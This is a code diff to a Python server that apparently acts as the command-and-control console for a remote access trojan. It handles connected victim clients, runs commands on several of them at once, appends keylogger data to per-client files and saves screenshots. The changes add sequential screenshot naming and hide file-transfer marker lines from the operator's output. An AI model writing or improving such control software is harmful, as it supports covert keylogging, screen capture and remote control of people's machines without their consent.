@@ -62,6 +62,7 @@ class ClientManager:
         self.next_id = 1
         self.client_hostnames: dict[int, str] = {}
         self.client_dirs: dict[int, str] = {}
+        self.screenshot_counter: dict[int, int] = {}
 
     def add(self, conn, addr) -> int:
         with self.lock:
@@ -365,11 +366,6 @@ def interactive_session(manager: ClientManager, conn, addr, cid: int, read_initi
             out = response.decode(errors="ignore")
             if out.endswith(prompt):
                 out = out[:-len(prompt)]
-            if "\n" in out:
-                last_nl = out.rfind("\n")
-                trail = out[last_nl+1:]
-                if "@" in trail and "[" in trail and trail.strip().endswith("]"):
-                    out = out[:last_nl] + "\n"
             out_clean = out.rstrip("\n")
             fname, fdata = parse_file_response(out_clean)
             if fname and fdata:
@@ -381,6 +377,12 @@ def interactive_session(manager: ClientManager, conn, addr, cid: int, read_initi
                         f.write(fdata)
                     _stream_msg(f"[Keylogger data appended ({len(fdata)} bytes)]")
                 elif client_dir:
+                    if line.startswith("screenshot"):
+                        with manager.lock:
+                            n = manager.screenshot_counter.get(cid, 0) + 1
+                            manager.screenshot_counter[cid] = n
+                        ext = os.path.splitext(fname)[1] or ".png"
+                        fname = f"screenshot_{n}{ext}"
                     save_path = os.path.join(client_dir, fname)
                     with open(save_path, "wb") as f:
                         f.write(fdata)
@@ -389,6 +391,16 @@ def interactive_session(manager: ClientManager, conn, addr, cid: int, read_initi
                     with open(fname, "wb") as f:
                         f.write(fdata)
                     print(f"[Saved file: {fname} ({len(fdata)} bytes)]")
+                out_lines = []
+                for _line in out.split("\n"):
+                    _lstripped = _line.lstrip()
+                    if (_lstripped.startswith("[file] ") or
+                        _lstripped.startswith("[file-start] ") or
+                        _lstripped.startswith("[file-chunk] ") or
+                        _lstripped.startswith("[file-end] ")):
+                        continue
+                    out_lines.append(_line)
+                out = "\n".join(out_lines)
             print(out, end="", flush=True)
         except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError):
             print("\n[Connection lost]")
@@ -480,11 +492,6 @@ def multi_run(manager: ClientManager, cmdline: str, timeout=15):
         prompt = ">> "
         if out.endswith(prompt):
             out = out[:-len(prompt)]
-        if "\n" in out:
-            last_nl = out.rfind("\n")
-            trail = out[last_nl+1:]
-            if "@" in trail and "[" in trail and trail.strip().endswith("]"):
-                out = out[:last_nl] + "\n"
         fname, fdata = parse_file_response(out)
         if fname and fdata:
             client_dir = manager.get_client_dir(cid)
